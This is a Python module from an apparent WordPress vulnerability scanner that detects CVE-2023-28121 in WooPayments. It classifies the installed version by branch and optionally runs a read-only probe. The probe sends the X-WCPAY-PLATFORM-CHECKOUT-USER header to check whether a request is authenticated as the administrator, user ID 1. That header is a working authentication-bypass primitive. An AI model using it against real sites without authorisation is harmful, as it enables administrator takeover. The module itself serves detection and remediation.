from __future__ import annotations

import json
from typing import Any

from ...core.http import normalize_url, request
from ...core.models import Finding
from ...core.versions import parse_version_safe
from .plugin_advisory import passive_plugin_finding

CVE_ID = "CVE-2023-28121"
NAME = "WooPayments authentication bypass"
COMPONENT = "WordPress plugin WooPayments"
AFFECTED_RULE = "WooPayments 4.8.0 and later unpatched releases through the affected 6.3 branch"
PLUGIN_SLUG = "woocommerce-payments"
HAS_EXPLOIT = True
EXPLOIT_MODES = ["safe"]

FIRST_FIXED_BY_BRANCH = {
    "4.8": "4.8.2",
    "4.9": "4.9.1",
    "5.0": "5.0.4",
    "5.1": "5.1.3",
    "5.2": "5.2.2",
    "5.3": "5.3.1",
    "5.4": "5.4.1",
    "5.5": "5.5.2",
    "5.6": "5.6.2",
    "5.7": "5.7.0",
    "6.2": "6.2.2",
    "6.3": "6.3.2",
}
KNOWN_PATCHED_RELEASES = {"6.3.0"}


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    minimum = parse_version_safe("4.8.0")
    globally_fixed = parse_version_safe("6.4.0")
    if parsed is None or minimum is None or globally_fixed is None:
        return "DETECTED_VERSION_UNKNOWN"
    if parsed < minimum:
        return "NOT_AFFECTED"
    if parsed >= globally_fixed:
        return "PATCHED"
    if str(parsed) in KNOWN_PATCHED_RELEASES:
        return "PATCHED"
    branch = f"{parsed.major}.{parsed.minor}"
    fixed = parse_version_safe(FIRST_FIXED_BY_BRANCH.get(branch))
    if fixed is None:
        # Releases after the 5.7.0 fix inherited the patch until the affected
        # 6.2 branch; do not guess for any other unlisted historical branch.
        if parse_version_safe("5.7.0") <= parsed < parse_version_safe("6.2.0"):
            return "PATCHED"
        return "DETECTED_VERSION_UNKNOWN"
    return "LIKELY_VULNERABLE" if parsed < fixed else "PATCHED"


def passive_result(plugins: dict[str, Any] | None) -> Finding:
    return passive_plugin_finding(
        cve=CVE_ID,
        name=NAME,
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        plugin_slug=PLUGIN_SLUG,
        plugins=plugins,
        classify=classify_version,
        remediation="Upgrade WooPayments to the patched release for its installed branch and review administrator accounts.",
        exploit_available=HAS_EXPLOIT,
    )


def run_safe_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
    proof_url = f"{normalize_url(target_url)}/wp-json/wp/v2/users/me?context=edit"
    response = request(
        proof_url,
        headers={"X-WCPAY-PLATFORM-CHECKOUT-USER": "1"},
        timeout=timeout,
        proxy=proxy,
    )
    try:
        payload = json.loads(response.get("body", ""))
    except (json.JSONDecodeError, TypeError):
        payload = {}
    authenticated_as_user = (
        response.get("status") == 200
        and isinstance(payload, dict)
        and payload.get("id") == 1
        and isinstance(payload.get("capabilities"), dict)
    )
    if authenticated_as_user:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status="VULNERABLE",
            confidence="CONFIRMED",
            component=COMPONENT,
            affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT,
            exploit_ran=True,
            proof_url=proof_url,
            detail="A read-only REST request carrying the WooPayments platform-checkout header was authenticated as user ID 1.",
            action="Upgrade WooPayments immediately and audit administrator accounts, API keys, and recent content changes.",
        )
    return Finding(
        cve=CVE_ID,
        name=NAME,
        status="NOT_CONFIRMED",
        confidence="MEDIUM",
        component=COMPONENT,
        affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        exploit_ran=True,
        detail=f"The read-only authentication-bypass probe was rejected or inconclusive (HTTP {response.get('status', 0)}).",
        action="Apply the patched WooPayments release for the installed branch when version assessment indicates exposure.",
    )


def check(
    target_url: str,
    cms_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    plugins: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    passive = passive_result(plugins)
    if not run_exploit_check:
        return passive
    if exploit_mode != "safe":
        passive.detail += " This module supports only the read-only REST authentication proof."
        return passive
    if passive.status not in {"LIKELY_VULNERABLE", "DETECTED_VERSION_UNKNOWN"}:
        passive.detail += " Safe proof skipped because WooPayments was not detected as potentially affected."
        return passive
    result = run_safe_probe(target_url, timeout=timeout, proxy=proxy)
    result.component_version = passive.component_version
    return result


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "wordpress",
        "name": NAME,
        "component": COMPONENT,
        "affected_rule": AFFECTED_RULE,
        "affected_versions": [">=4.8.0, branch-specific fixes through 6.3"],
        "exploit_available": HAS_EXPLOIT,
        "exploit_modes": EXPLOIT_MODES,
        "intrusive": False,
        "module_version": "1.0.0",
        "last_reviewed": "2026-09-29",
        "updated": "2026-09-29",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2023-28121",
            "https://developer.woocommerce.com/2023/03/23/critical-vulnerability-detected-in-woocommerce-payments-what-you-need-to-know/",
            "https://github.com/rapid7/metasploit-framework/issues/18159",
        ],
        "credits": ["Michael Mazzolini / GoldNetwork", "Rapid7 Metasploit contributors"],
    }
